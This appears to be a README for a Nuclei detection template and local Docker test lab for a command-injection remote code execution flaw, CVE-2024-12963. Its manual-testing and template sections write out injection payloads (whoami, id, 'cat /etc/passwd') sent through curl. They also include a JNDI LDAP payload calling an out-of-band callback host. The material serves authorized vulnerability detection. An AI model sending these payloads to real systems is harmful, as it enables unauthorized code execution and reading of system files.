# CVE-2024-12963 Test Environment

## Overview

This directory contains the Nuclei template and test environment for CVE-2024-12963 - Web Application Framework < 2.1.0 Remote Code Execution vulnerability.

## Quick Start

### 1. Build and Run Vulnerable Environment

```bash
# Build the vulnerable Docker image
docker build -t cve-2024-12963-test .

# Run the vulnerable application
docker run -p 8080:8080 cve-2024-12963-test
```

### 2. Test with Nuclei

```bash
# Basic test
nuclei -u http://127.0.0.1:8080 -t http/cves/2024/CVE-2024-12963.yaml

# Test with debug output
nuclei -u http://127.0.0.1:8080 -t http/cves/2024/CVE-2024-12963.yaml --debug -vv

# Test with verbose output
nuclei -u http://127.0.0.1:8080 -t http/cves/2024/CVE-2024-12963.yaml -v -debug
```

## Manual Testing

### 1. Check Application Status

```bash
# Check if application is running
curl -I http://127.0.0.1:8080/

# Get version information
curl http://127.0.0.1:8080/version
```

### 2. Test Command Injection

```bash
# Test whoami command
curl -X POST http://127.0.0.1:8080/api/process \
  -H "Content-Type: application/json" \
  -d '{"action":"execute","data":"whoami","format":"shell"}'

# Test file reading
curl -X POST http://127.0.0.1:8080/api/process \
  -H "Content-Type: application/json" \
  -d '{"action":"execute","data":"cat /etc/passwd","format":"shell"}'

# Test system information
curl -X POST http://127.0.0.1:8080/api/process \
  -H "Content-Type: application/json" \
  -d '{"action":"execute","data":"id","format":"shell"}'
```

## Expected Results

### Vulnerable Systems (v1.9.5)
- HTTP 200 status codes with command output
- JSON responses containing command execution results
- System information like "root:", "uid=", "gid=" in response body
- "Command executed successfully" messages

### Non-Vulnerable Systems (≥2.1.0)
- HTTP 400/401/403 status codes
- Error messages about invalid requests
- No command execution output
- Application continues running normally

## Template Features

### Multi-Payload Detection
- **whoami command**: `|whoami`, `||whoami`, `&&whoami`
- **File reading**: `';cat /etc/passwd;'`, `;cat /etc/passwd`
- **System info**: `` `id` ``, `$(whoami)`
- **JNDI injection**: `${jndi:ldap://{{interactsh-url}}/a}`

### Detection Methods
- **Response Analysis**: Detects command execution output
- **Pattern Matching**: Looks for system information in responses
- **Out-of-Band Detection**: Uses interactsh for JNDI injection validation
- **Version Extraction**: Extracts version information to verify vulnerability

### Matchers
- `contains(body, "root:")` - Detects /etc/passwd content
- `contains(body, "uid=")` - Detects system user information
- `regex: "uid=[0-9]+"` - Regex for user ID patterns
- `status: 200` - Confirms successful execution

## Safety Considerations

⚠️ **WARNING**: This template is designed to trigger command execution and may:
- Execute system commands on the target
- Access sensitive system information
- Modify system files or configurations
- Generate security alerts

**Only test against authorized systems in controlled environments.**

## Troubleshooting

### Common Issues

1. **Template not detecting vulnerability**
   - Verify web framework is actually running on port 8080
   - Check if version is vulnerable (< 2.1.0)
   - Ensure proper network connectivity

2. **False positives**
   - Verify version is actually vulnerable
   - Check application logs for command execution
   - Monitor system processes during testing

3. **Application not responding**
   - Check if command execution caused issues
   - Verify application restart capability
   - Check system logs for errors

### Debug Commands

```bash
# Check application status
ps aux | grep python
netstat -tlnp | grep 8080

# View application logs
docker logs <container_id>

# Monitor system resources
htop
dmesg | tail -20
```

## Files

- `CVE-2024-12963.yaml` - Nuclei template
- `Dockerfile` - Vulnerable test environment
- `test-cve-2024-12963.sh` - Linux/macOS test script
- `test-cve-2024-12963.bat` - Windows test script
- `CVE-2024-12963-test-env.md` - Detailed test environment setup
- `README-CVE-2024-12963.md` - Comprehensive documentation

## References

- **CVE Details**: https://nvd.nist.gov/vuln/detail/CVE-2024-12963
- **MITRE CVE**: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-12963
- **Nuclei Documentation**: https://nuclei.projectdiscovery.io/

---

**Note**: This template is designed for security research and authorized testing only. Always obtain proper authorization before testing against any systems.
